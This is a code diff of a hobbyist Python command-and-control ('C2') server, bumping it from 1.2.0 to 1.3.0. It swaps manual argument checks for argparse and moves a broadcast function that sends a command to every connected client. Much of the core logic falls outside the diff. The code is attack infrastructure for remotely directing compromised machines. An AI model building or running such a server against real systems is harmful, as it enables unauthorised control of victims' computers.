@@ -1,19 +1,12 @@
 # ==================================================================================================================== #
-# Version 1.2.0 of my C2 Server!                                                                                       #
+# Version 1.3.0 of my C2 Server!                                                                                       #
 # Made by Eric E. Github: https://github.com/EricEsquivel                                                              #
 # ==================================================================================================================== #
 
 import socket
 import sys
 import threading
-import time
-
-
-def usage():
-    print("""
-    usage: server.py <ip> <port>
-    """)
-    sys.exit()
+import argparse
 
 
 def start(cmdaddress):
@@ -55,13 +48,6 @@ def handle_clients(connection, address):
         sys.exit()
 
 
-def broadcast(command):
-    command = command.encode("utf-8")
-    for thread in thread_list:
-        connection = thread._args[0]
-        connection.send(command)
-
-
 def sending():
     command = ''
     while command != "stopall":
@@ -77,43 +63,30 @@ def sending():
             broadcast(command)
 
 
-# Run checks for args
-if len(sys.argv) == 1:
-    print("Missing arguments. Looking for ip and port")
-    usage()
-elif len(sys.argv) == 2:
-    if sys.argv[1] == "help" or sys.argv[1] == "-h" or sys.argv[1] == "--help":
-        usage()
-        sys.exit()
-    print("Missing arguments. Looking for a port")
-    usage()
-elif len(sys.argv) > 3:
-    print("Too many arguments!")
-    usage()
-else:
-    pass
+def broadcast(command):
+    command = command.encode("utf-8")
+    for thread in thread_list:
+        connection = thread._args[0]
+        connection.send(command)
 
-cmdserver_ip = sys.argv[1]
-try:
-    cmdserver_port = int(sys.argv[2])
-    if cmdserver_port not in range(1,65536):
-        raise Exception
-except ValueError:
-    print("Port given is not an integer")
-    usage()
-except:
-    print("Port given is not in range!")
-    usage()
 
-# Final check
+# Run checks with argparse #
+ap = argparse.ArgumentParser(description=f"Example: {sys.argv[0]} 127.0.0.1 4444")
+ap.add_argument("listenip", help="Enter IP address to listen on", type=str)
+ap.add_argument("listenport", help="Enter port to listen on", type=int)
+parseargs = ap.parse_args()
+cmdserver_ip = parseargs.listenip
+cmdserver_port = parseargs.listenport
+
+# Final check #
 cmdaddress = (cmdserver_ip,cmdserver_port)
 s = socket.socket()
 try:
     s.bind(cmdaddress)
 except socket.gaierror:
-    print("Invalid address given")
-    usage()
-
+    print("Invalid address or port given")
+    sys.exit()
+# ------------------------------------#
 
 thread_list = []
 thread_recv_list = []
